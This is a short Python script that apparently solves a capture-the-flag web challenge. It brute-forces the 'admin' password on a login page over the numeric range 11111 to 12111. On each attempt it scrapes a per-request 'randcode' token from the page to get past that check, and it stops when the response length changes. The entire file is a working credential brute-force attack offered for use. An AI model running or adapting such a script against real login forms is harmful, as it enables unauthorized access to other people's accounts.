#coding = utf8
import requests
import time
url = "http://daka.whaledu.com/web/web38/9s81jWjd98YU.php"
fast_session = requests.Session()
for i in range(11111,12111):
    res=fast_session.get(url)
    recon = res.content
    rancode = recon[recon.find('randcode')+23:recon.find('randcode')+26]
    #randcode=randcode(511:514)
    #print rancode
    res = fast_session.get(url+"?username=admin&password="+str(i)+"&randcode="+rancode)
    f = open('RES.txt','w')
    f.write(res.content)
    f.close
    #print res.content
    print len(res.content)
    if len(res.content)!=160:
        break
    time.sleep(0.5)